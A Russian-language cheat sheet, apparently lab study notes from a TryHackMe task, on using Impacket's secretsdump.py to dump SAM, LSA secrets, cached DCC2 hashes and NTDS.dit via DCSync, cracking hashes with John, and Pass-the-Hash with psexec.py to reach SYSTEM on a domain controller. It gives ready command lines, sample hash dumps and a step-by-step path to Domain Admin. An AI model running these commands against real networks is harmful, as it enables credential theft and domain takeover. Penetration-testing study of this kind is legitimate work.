# SECRETSDUMP.PY — УДАЛЕННОЕ ИЗВЛЕЧЕНИЕ CREDENTIALS

## Что это

Утилита из Impacket, которая извлекает credentials удаленно через DCE/RPC.
Не требует загрузки бинарников на целевую машину.

## Что умеет

- Локальные хэши (SAM)
- LSA Secrets (кэшированные креды, пароли служб)
- NTDS.dit (все хэши домена) через DCSync


## КЛЮЧЕВОЕ ТРЕБОВАНИЕ К ПРАВАМ

**secretsdump.py НЕ работает с обычным пользователем.**

Для каждой операции нужны высокие привилегии:
- **Local Administrator** — для извлечения SAM, LSA, MSCache2 с конкретной машины
- **Domain Administrator** — для DCSync (NTDS.dit)

Обычный доменный пользователь без прав не сможет выполнить ни одну из этих команд.


# 1. ИЗВЛЕЧЕНИЕ ЛОКАЛЬНЫХ ДАННЫХ

## Требуемые права

**Local Administrator** на целевой машине.

## Команда

secretsdump.py HOST/Administrator:password@TARGET_IP -output dump

## Формат

WRK/Administrator:N3w34829DJdd?1@10.220.10.20

## Что получаем

- SAM хэши локальных пользователей
- MSCache2 (DCC2) хэши — кэшированные доменные креды

## Пример вывода (SAM)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:78165db7b3687203aa6eb88332504bda:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ElonTusk:1001:aad3b435b51404eeaad3b435b51404ee:c2546047cca718bd2ba7538e5bfcb4b2:::

## Пример вывода (MSCache2 / DCC2)

TRYHACKME.LOC/Administrator:$DCC2$10240#Administrator#ea671e1143604bb87c6d48f6b5475c08
TRYHACKME.LOC/raoulduke:$DCC2$10240#raoulduke#1f7300ae177dbc29bf756b1039313e0b
TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#a98704b0d7273fba939be51549f9782a


# 2. MSCACHE2 (DCC2) ХЭШИ

## Что это

Domain Cached Credentials version 2 — кэшированные доменные креды для офлайн входа.
Хранятся локально на каждой машине, где пользователь когда-либо логинился.

## Как получить

Только с правами **Local Administrator** на машине.

## Зачем нужны

- Позволяют войти в домен без связи с DC (ноутбуки вне офиса)
- Атакующий с локальным админом может их извлечь

## Нюанс (ВАЖНО)

DCC2 хэши НЕЛЬЗЯ использовать для Pass-the-Hash.
Их нужно взламывать офлайн через John или Hashcat.

## Формат DCC2 хэша

$DCC2$10240#username#hash


# 3. ВЗЛОМ MSCACHE2 (DCC2) ХЭШЕЙ

## John the Ripper

john --format=mscash2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

## Формат

--format=mscash2 — указываем тип хэша
--wordlist — словарь


# 4. DCSYNC — ИЗВЛЕЧЕНИЕ NTDS.DIT

## Что это

Имитация репликации между DC. Запрос базы AD (NTDS.dit) через сеть.

## Требуемые права

**Domain Administrator** (или пользователь с правами Replicating Directory Changes и Replicating Directory Changes All).

Обычный доменный пользователь НЕ подойдет.

## Команда с паролем

secretsdump.py DOMAIN/username:password@DC_IP -just-dc -output dump

## Команда с хэшем

secretsdump.py DOMAIN/username@DC_IP -hashes :NTLM_HASH -just-dc

## -just-dc

Флаг означает: только NTDS.dit (без SAM/LSA на DC).

## Пример вывода

Administrator:500:aad3b435b51404eeaad3b435b51404ee:78165db7b3687203aa6eb88332504bda:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:399b08294203eeafef6c1ec6d5747127:::
drgonzo:1611:aad3b435b51404eeaad3b435b51404ee:e2c947a3cce1634343ac1cfaa3ca506d:::

## Формат вывода

username:RID:LM_hash:NTLM_hash:::

LM_hash — aad3b435b51404eeaad3b435b51404ee = пустой (отключен)


# 5. PASS-THE-HASH С NTLM

## Что это

С NTLM хэшом можно авторизоваться без пароля.

## Требуемые права

Сам по себе PtH не требует дополнительных прав — хэш заменяет пароль.
Но для удаленного подключения к машине (например, через psexec) нужен **Local Administrator** на целевой машине.

## Для чего используется

- Движение по сети
- Запуск команд на удаленных машинах
- Получение shell

## Пример с psexec.py

psexec.py 'DOMAIN/Administrator@TARGET_IP' -hashes :NTLM_HASH

## Результат

Сразу получаем shell как nt authority\system.


# ЭТАПЫ ПУТИ К DOMAIN ADMIN (из задания)

1. Получаем **Local Administrator** на рабочей станции (WRK)
2. Запускаем `secretsdump.py` с локальным админом
3. Получаем DCC2 хэш пользователя drgonzo
4. Взламываем DCC2 хэш через John → получаем пароль
5. Имеем доменную учетку drgonzo (НЕ Domain Admin)
6. Запускаем `secretsdump.py -just-dc` с drgonzo на DC
7. Получаем NTLM хэш Administrator
8. Используем `psexec.py` с Pass-the-Hash → shell как SYSTEM на DC

## Ключевые моменты

- DCC2 хэш дал доменную учетку (после взлома)
- Доменная учетка drgonzo имела права на DCSync (не всегда так)
- DCSync дал хэш админа
- Хэш админа дал shell


# СРАВНЕНИЕ ТИПОВ ХЭШЕЙ

## NTLM
- Откуда: SAM, NTDS.dit, LSASS
- Нужны права: Local Admin для извлечения с машины, Domain Admin для DCSync
- Можно ли использовать для Pass-the-Hash: **ДА**
- Что дает: доступ к машинам, где есть этот пользователь

## MSCache2 (DCC2)
- Откуда: локальный кэш (только с Local Admin)
- Нужны права: **Local Administrator**
- Можно ли использовать для Pass-the-Hash: **НЕТ**
- Что дает: только взлом офлайн → пароль

## Kerberos билеты
- Откуда: LSASS (только с Local Admin)
- Нужны права: **Local Administrator**
- Можно ли использовать: **ДА** (Pass-the-Ticket)
- Что дает: доступ как пользователь


# БЫСТРАЯ ШПАРГАЛКА SECRETSDUMP

# Локальные креды (нужен Local Administrator на цели)
secretsdump.py WRK/Administrator:pass@10.10.10.20

# Только SAM (нужен Local Administrator)
secretsdump.py WRK/Administrator:pass@10.10.10.20 -output dump

# DCSync (нужен Domain Administrator)
secretsdump.py DOMAIN/admin@DC_IP -just-dc

# DCSync с хэшем (нужен Domain Administrator)
secretsdump.py DOMAIN/admin@DC_IP -hashes :NTLM_HASH -just-dc

# Сохранить вывод в файл
secretsdump.py DOMAIN/user@IP -just-dc -output dump

# Pass-the-Hash shell через psexec (нужен Local Admin на цели)
psexec.py 'DOMAIN/Administrator@IP' -hashes :NTLM_HASH


# ЧТО МОЖНО СДЕЛАТЬ БЕЗ АДМИНСКИХ ПРАВ

secretsdump.py НЕ РАБОТАЕТ без админских прав.

Для начальной разведки без админа используй:

- `net user /domain`
- `whoami /all`
- `quser`
- BloodHound (`SharpHound.exe` или `bloodhound-python`)
- Kerberoasting (`GetUserSPNs.py`)
- AS-REP Roasting (`GetNPUsers.py`)
- Password spraying (`nxc smb ...`)


# ВАЖНОЕ УТОЧНЕНИЕ ПО psexec.py

psexec.py с Pass-the-Hash требует **Local Administrator** на целевой машине.

Хэш обычного пользователя НЕ даст shell через psexec.

Пример:
psexec.py 'DOMAIN/Administrator@IP' -hashes :NTLM_HASH  ✅ работает
psexec.py 'DOMAIN/john.doe@IP' -hashes :NTLM_HASH     ❌ не сработает, если john.doe не админ

*** psexec.py создает службу через ADMIN$ share — это требует административных привилегий. ***

# Что извлекает secretsdump.py с правами Local Administrator на рабочей станции

1. SAM хэши (локальные пользователи)
2. LSA Secrets (пароли служб, кэш)
3. MSCache2 (DCC2) — кэшированные доменные креды

НЕ извлекает NTDS.dit — это только на DC через DCSync.


# ПОЧЕМУ DOMAIN ADMIN — ЭТО КОНЕЧНАЯ ЦЕЛЬ

Local Admin = контроль над ОДНИМ компьютером
Domain Admin = контроль над ВСЕМИ компьютерами домена

Что дает Domain Admin:
- Доступ к любому серверу и рабочей станции
- DCSync (хэши ВСЕХ пользователей)
- Изменение GPO (политики для всего домена)
- Создание/удаление любых учеток
- Персистенс (закрепиться на уровне домена)

Иерархия прав (от низших к высшим):
1. Local User (только свой комп)
2. Domain User (может ходить по разрешенным машинам)
3. Local Admin (полный контроль над ОДНОЙ машиной)
4. Domain Admin (полный контроль над ВСЕМ доменом)

Цель пентеста: показать путь от обычного пользователя до Domain Admin.